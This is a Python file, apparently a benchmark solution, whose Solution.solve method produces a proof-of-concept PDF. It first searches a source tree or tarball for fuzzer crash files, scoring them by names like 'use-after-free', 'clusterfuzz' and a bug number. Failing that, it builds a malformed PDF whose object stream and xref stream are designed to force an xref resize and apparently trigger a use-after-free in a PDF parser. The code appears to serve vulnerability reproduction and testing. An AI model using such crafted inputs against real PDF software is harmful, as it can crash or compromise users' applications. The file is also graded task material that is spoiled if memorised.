import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


def _make_indirect_object(objnum: int, content: bytes, gen: int = 0) -> bytes:
    return f"{objnum} {gen} obj\n".encode("ascii") + content + b"\nendobj\n"


def _make_stream_object(objnum: int, dict_inner_ascii: str, stream_data: bytes, gen: int = 0) -> bytes:
    d = f"<< {dict_inner_ascii} /Length {len(stream_data)} >>\nstream\n".encode("ascii")
    content = d + stream_data + b"\nendstream"
    return _make_indirect_object(objnum, content, gen=gen)


def _build_fallback_pdf_poc() -> bytes:
    header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

    # Object stream 8: contains objects 1, 2, and a large object number to force xref resize.
    obj1_in_objstm = b"<< /Type /Catalog /Pages 2 0 R >>"
    obj2_in_objstm = b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>"
    obj1000_in_objstm = b"<<>>"

    sep = b"\n"
    obj_contents = obj1_in_objstm + sep + obj2_in_objstm + sep + obj1000_in_objstm
    off2 = len(obj1_in_objstm) + len(sep)
    off1000 = off2 + len(obj2_in_objstm) + len(sep)

    objstm_header = f"1 0 2 {off2} 1000 {off1000} ".encode("ascii")
    first = len(objstm_header)
    objstm_data = objstm_header + obj_contents

    obj3 = _make_indirect_object(
        3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << >> /Contents 4 0 R >>",
    )

    content_stream = b"q\nQ\n"
    obj4 = _make_stream_object(4, "", content_stream)

    obj8 = _make_stream_object(8, f"/Type /ObjStm /N 3 /First {first}", objstm_data)

    # Assemble all objects except xref stream first to compute offsets.
    parts: List[bytes] = [header]
    offsets: Dict[int, int] = {}

    for objnum, objbytes in [(3, obj3), (4, obj4), (8, obj8)]:
        offsets[objnum] = sum(len(p) for p in parts)
        parts.append(objbytes)

    xref_objnum = 7
    xref_offset = sum(len(p) for p in parts)

    # Build xref stream entries for objects 0..8 (/Size 9)
    # /W [1 4 2]: type, field2, field3 (big-endian)
    def xref_entry(t: int, f2: int, f3: int) -> bytes:
        return bytes([t]) + int(f2).to_bytes(4, "big", signed=False) + int(f3).to_bytes(2, "big", signed=False)

    size = 9  # objects 0..8
    entries = []
    for n in range(size):
        if n == 0:
            entries.append(xref_entry(0, 0, 65535))
        elif n == 1:
            # compressed in object stream 8, index 0
            entries.append(xref_entry(2, 8, 0))
        elif n == 2:
            # compressed in object stream 8, index 1
            entries.append(xref_entry(2, 8, 1))
        elif n == 3:
            entries.append(xref_entry(1, offsets[3], 0))
        elif n == 4:
            entries.append(xref_entry(1, offsets[4], 0))
        elif n == 7:
            entries.append(xref_entry(1, xref_offset, 0))
        elif n == 8:
            entries.append(xref_entry(1, offsets[8], 0))
        else:
            entries.append(xref_entry(0, 0, 0))

    xref_data = b"".join(entries)

    xref_dict = f"/Type /XRef /Size {size} /Root 1 0 R /W [1 4 2] /Index [0 {size}]"
    obj7 = _make_stream_object(xref_objnum, xref_dict, xref_data)

    parts.append(obj7)
    parts.append(f"startxref\n{xref_offset}\n%%EOF\n".encode("ascii"))
    return b"".join(parts)


def _is_pdf_header(buf: bytes) -> bool:
    if not buf:
        return False
    if buf.startswith(b"%PDF-"):
        return True
    # Sometimes starts with whitespace or garbage before header; accept if early.
    idx = buf.find(b"%PDF-")
    return 0 <= idx <= 1024


def _score_pdf_candidate(name: str, data_prefix: bytes, size: int) -> int:
    lname = name.lower()
    score = 0
    if lname.endswith(".pdf"):
        score += 500
    if _is_pdf_header(data_prefix):
        score += 2000
    for kw, pts in [
        ("59207", 3000),
        ("uaf", 1500),
        ("use-after-free", 2000),
        ("use_after_free", 2000),
        ("clusterfuzz", 1500),
        ("oss-fuzz", 1500),
        ("poc", 1000),
        ("repro", 1000),
        ("crash", 1000),
        ("objstm", 800),
        ("xref", 600),
    ]:
        if kw in lname:
            score += pts

    # Size heuristic: prefer near 6431, but allow variety.
    target = 6431
    score += max(0, 2000 - int(abs(size - target) / 2))
    return score


def _try_find_embedded_pdf(src_path: str) -> Optional[bytes]:
    best_score = -1
    best_bytes: Optional[bytes] = None

    def consider(name: str, get_bytes_callable):
        nonlocal best_score, best_bytes
        try:
            prefix = get_bytes_callable(4096)
            if not _is_pdf_header(prefix) and not name.lower().endswith(".pdf"):
                return
            full = get_bytes_callable(None)
            if not _is_pdf_header(full[:4096]):
                return
            score = _score_pdf_candidate(name, full[:4096], len(full))
            if score > best_score:
                best_score = score
                best_bytes = full
        except Exception:
            return

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if not (fn.lower().endswith(".pdf") or "poc" in fn.lower() or "clusterfuzz" in fn.lower() or "repro" in fn.lower()):
                    continue
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                    if st.st_size <= 0 or st.st_size > 5_000_000:
                        continue
                except Exception:
                    continue

                def reader(n, path=p):
                    with open(path, "rb") as f:
                        if n is None:
                            return f.read()
                        return f.read(n)

                relname = os.path.relpath(p, src_path)
                consider(relname, reader)
    else:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 5_000_000:
                        continue
                    lname = m.name.lower()
                    if not (lname.endswith(".pdf") or "poc" in lname or "clusterfuzz" in lname or "repro" in lname or "crash" in lname or "oss-fuzz" in lname or "oss_fuzz" in lname):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    if not _is_pdf_header(data[:4096]):
                        continue
                    score = _score_pdf_candidate(m.name, data[:4096], len(data))
                    if score > best_score:
                        best_score = score
                        best_bytes = data

    return best_bytes


class Solution:
    def solve(self, src_path: str) -> bytes:
        embedded = _try_find_embedded_pdf(src_path)
        if embedded is not None:
            return embedded
        return _build_fallback_pdf_poc()